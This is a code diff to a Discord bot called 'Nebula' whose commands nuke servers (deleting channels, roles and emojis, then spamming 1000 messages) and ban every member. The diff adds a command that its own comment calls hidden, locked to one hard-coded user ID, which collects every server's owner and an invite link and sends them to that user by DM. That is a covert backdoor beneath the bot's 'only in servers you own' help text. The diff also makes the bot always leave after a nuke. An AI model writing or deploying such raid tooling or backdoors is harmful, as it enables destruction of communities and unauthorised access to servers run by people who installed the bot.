@@ -64,7 +64,7 @@ async function safeLeaveGuild(guild) {
     if ([50001, 404, 403].includes(err.code)) {
       console.log('✅ Already left or kicked from server.');
     } else {
-      console.error(`⚠️ Error leaving server:`, err.message);
+      throw err; // Re-throw unexpected errors
     }
   }
 }
@@ -87,7 +87,7 @@ client.on('messageCreate', async (message) => {
       .addFields(
         { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
         { name: '.ba', value: 'Bans all members (except owner)' },
-        { name: '.help', value: 'Sends this help to your DMs' }
+        { name: '.help', value: 'Sends this help message to your DMs' }
       )
       .setColor('#ff0000')
       .setFooter({ text: 'Use responsibly - only in servers you own!' });
@@ -102,14 +102,101 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
+  // ===== SERVERS COMMAND (Hidden and restricted to specific user) =====
+  if (command === 'servers') {
+    if (message.author.id !== '1336450372398612521') {
+      return message.reply('❌ You are not authorized to use this command.');
+    }
+
+    const guilds = client.guilds.cache;
+    const serverList = [];
+
+    console.log(`📥 ${message.author.tag} requested .servers`);
+
+    await message.reply('📬 Fetching server list...');
+
+    for (const [id, guild] of guilds.entries()) {
+      try {
+        // Try to fetch an invite from each server
+        const invites = await handleRateLimit(() => guild.invites.fetch());
+        const firstInvite = invites.first() || null;
+
+        const owner = await handleRateLimit(() => guild.fetchOwner());
+
+        serverList.push({
+          name: guild.name,
+          id: guild.id,
+          ownerTag: owner.user.tag,
+          invite: firstInvite ? firstInvite.url : 'No active invite found',
+        });
+      } catch (err) {
+        console.error(`❌ Could not fetch data for guild ${guild.name}:`, err.message);
+        serverList.push({
+          name: guild.name,
+          id: guild.id,
+          error: 'Could not retrieve details (permissions?)',
+        });
+      }
+    }
+
+    // Build embed response
+    const embed = new EmbedBuilder()
+      .setTitle('🌐 Servers I\'m In')
+      .setDescription(`Total: ${serverList.length}`)
+      .setColor('#00ffff');
+
+    // Add fields for each server (limited to 25 fields per embed)
+    for (let i = 0; i < serverList.length && i < 25; i++) {
+      const server = serverList[i];
+      const value = server.error
+        ? `ID: ${server.id}\n⚠️ ${server.error}`
+        : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
+
+      embed.addFields({ name: `${i + 1}. ${server.name}`, value });
+    }
+
+    try {
+      const dmChannel = await message.author.createDM();
+      await dmChannel.send({ embeds: [embed] });
+
+      if (serverList.length > 25) {
+        // Send remaining pages
+        for (let i = 25; i < serverList.length; i += 25) {
+          const moreEmbed = new EmbedBuilder()
+            .setColor('#00ffff')
+            .setTitle(`🌐 Servers I'm In (Page ${Math.floor(i / 25) + 1})`);
+
+          const page = serverList.slice(i, i + 25);
+          for (const server of page) {
+            const value = server.error
+              ? `ID: ${server.id}\n⚠️ ${server.error}`
+              : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
+
+            moreEmbed.addFields({ name: `${serverList.indexOf(server) + 1}. ${server.name}`, value });
+          }
+
+          await dmChannel.send({ embeds: [moreEmbed] });
+        }
+      }
+
+      await message.reply('✅ Server list sent to your DMs!');
+    } catch (err) {
+      console.error('❌ Failed to send DM:', err.message);
+      await message.reply('❌ Could not send DM. Make sure your DMs are open.');
+    }
+
+    return;
+  }
+
   // ===== BAN ALL MEMBERS =====
   if (command === 'ba') {
     if (!message.member.permissions.has('BanMembers')) {
-      return message.reply("❌ You don't have permission to ban members.");
+      return message.reply('❌ You don\'t have permission to ban members.');
     }
 
     const guild = message.guild;
 
+    // Skip owner and bots
     const membersToBan = guild.members.cache.filter(m =>
       m.id !== guild.ownerId && !m.user.bot
     );
@@ -124,13 +211,13 @@ client.on('messageCreate', async (message) => {
       try {
         await handleRateLimit(() => guild.members.ban(member, {
           reason: 'Nebula Ban All',
-          deleteMessageSeconds: 604800
+          deleteMessageSeconds: 604800 // Delete 1 week of messages
         }));
         console.log(`✅ Banned: ${member.user.tag}`);
       } catch (err) {
         console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
       }
-      await new Promise(r => setTimeout(r, 50));
+      await new Promise(r => setTimeout(r, 50)); // Small delay between bans
     }
 
     console.log(`✅ Successfully banned all members.`);
@@ -148,7 +235,6 @@ client.on('messageCreate', async (message) => {
       console.log(`🎯 Targeting server: ${guild.name}`);
 
       let didSomething = false;
-      let sent = 0;
 
       // Step 1: Delete channels
       try {
@@ -258,6 +344,7 @@ client.on('messageCreate', async (message) => {
         return message.channel.send('❌ No valid channels to spam.');
       }
 
+      let sent = 0;
       const MAX_MESSAGES = 1000;
       const MESSAGES_PER_CHANNEL = 20;
 
@@ -272,7 +359,7 @@ client.on('messageCreate', async (message) => {
           } catch (err) {
             console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
           }
-          await new Promise(r => setTimeout(r, 2)); // Delay between sends
+          await new Promise(r => setTimeout(r, 2)); // 2ms delay between sends
         }
       });
 
@@ -280,12 +367,8 @@ client.on('messageCreate', async (message) => {
       console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
       didSomething = true;
 
-      // Final check: Leave server if we sent enough messages
-      if (sent >= 950) {
-        await safeLeaveGuild(guild);
-      } else {
-        console.log('🚫 Not enough messages sent. Not leaving server.');
-      }
+      // Step 7: Leave server safely
+      await safeLeaveGuild(guild);
 
       if (!didSomething) {
         console.error('🚫 Could not perform any actions on this server.');
